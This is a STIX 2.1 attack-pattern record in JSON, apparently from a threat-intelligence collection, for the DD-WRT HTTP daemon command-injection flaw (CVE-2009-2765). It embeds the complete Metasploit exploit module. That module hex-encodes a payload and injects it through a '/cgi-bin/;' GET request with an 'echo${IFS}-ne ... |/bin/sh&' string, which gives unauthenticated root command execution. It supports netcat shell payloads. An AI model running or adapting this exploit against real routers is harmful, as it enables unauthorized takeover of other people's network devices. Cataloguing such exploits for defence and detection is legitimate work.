{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--11d9d0e4-f37c-4055-a711-6654aa2a8d1a",
    "created": "2024-08-14T17:01:00.820993Z",
    "modified": "2024-08-14T17:01:00.820997Z",
    "name": "DD-WRT HTTP Daemon Arbitrary Command Execution",
    "description": " This module abuses a metacharacter injection vulnerability in the HTTP management server of wireless gateways running DD-WRT. This flaw allows an unauthenticated attacker to execute arbitrary commands as the root user account. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ddwrt_cgibin_exec.rb",
            "external_id": "ddwrt_cgibin_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2765"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /DD-WRT/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DD-WRT HTTP Daemon Arbitrary Command Execution',\n      'Description'    => %q{\n          This module abuses a metacharacter injection vulnerability in the\n        HTTP management server of wireless gateways running DD-WRT. This flaw\n        allows an unauthenticated attacker to execute arbitrary commands as\n        the root user account.\n      },\n      'Author'         => [ 'gat3way', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-2765' ],\n          [ 'OSVDB', '55990' ],\n          [ 'BID', '35742' ],\n          [ 'EDB', '9209' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'RequiredCmd' => 'generic netcat netcat-e'\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-07-20'\n      ))\n  end\n\n  def exploit\n\n    cmd = payload.encoded.unpack(\"C*\").map{|c| \"\\\\x%.2x\" % c}.join\n    # TODO: force use of echo-ne CMD encoder\n    str = \"echo${IFS}-ne${IFS}\\\"#{cmd}\\\"|/bin/sh&\"\n\n    print_status(\"Sending GET request with encoded command line...\")\n    send_request_raw({ 'uri' => \"/cgi-bin/;#{str}\" })\n\n    print_status(\"Giving the handler time to run...\")\n    handler\n\n    select(nil, nil, nil, 10.0)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-07-20",
    "x_mitre_platforms": [
        "['unix']"
    ]
}